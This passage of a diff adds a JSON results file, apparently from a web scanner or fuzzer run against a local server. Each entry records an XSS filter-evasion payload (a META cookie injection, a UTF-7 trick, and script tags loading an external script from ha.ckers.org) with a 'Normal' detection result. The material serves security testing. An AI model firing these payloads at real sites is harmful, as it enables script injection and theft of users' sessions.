+    "Word": "\u003CMETA HTTP-EQUIV=\u0022Set-Cookie\u0022 Content=\u0022USERID=\u0026lt;SCRIPT\u0026gt;alert(\u0027XSS\u0027)\u0026lt;/SCRIPT\u0026gt;\u0022\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CHEAD\u003E\u003CMETA HTTP-EQUIV=\u0022CONTENT-TYPE\u0022 CONTENT=\u0022text/html; charset=UTF-7\u0022\u003E \u003C/HEAD\u003E\u002BADw-SCRIPT\u002BAD4-alert(\u0027XSS\u0027);\u002BADw-/SCRIPT\u002BAD4-",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 25,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT a=\u0022\u003E\u0022 SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 24,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT a=\u0022\u003E\u0022 \u0027\u0027 SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 24,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT \u0022a=\u0027\u003E\u0027\u0022 SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 24,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT a=\u0060\u003E\u0060 SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 24,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  },
+  {
+    "StatusCode": 200,
+    "Word": "\u003CSCRIPT\u003Edocument.write(\u0022\u003CSCRI\u0022);\u003C/SCRIPT\u003EPT SRC=\u0022http://ha.ckers.org/xss.js\u0022\u003E\u003C/SCRIPT\u003E",
+    "Url": "http://localhost:3000/",
+    "ContentLength": 75032,
+    "WordCount": 3609,
+    "LineCount": 31,
+    "DurationMs": 24,
+    "Detection": {
+      "Score": 0,
+      "Severity": "Normal",
+      "VulnType": "None",
+      "Summary": "",
+      "Signals": []
+    }
+  }
+]
